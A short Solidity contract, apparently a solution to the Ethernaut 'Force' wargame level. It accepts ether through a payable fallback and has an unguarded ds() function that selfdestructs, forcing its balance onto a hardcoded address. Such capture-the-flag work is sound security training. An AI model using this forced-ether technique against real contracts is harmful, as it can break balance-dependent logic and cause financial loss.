pragma solidity ^0.4.0;
contract Ethernaut_force_hack {
    
    function ds() external {
        selfdestruct(0x25fa4f1a5eB175D3daea3BFCEf2ae8EE0307F46c);
    }

    function () external payable {
        
    }
}
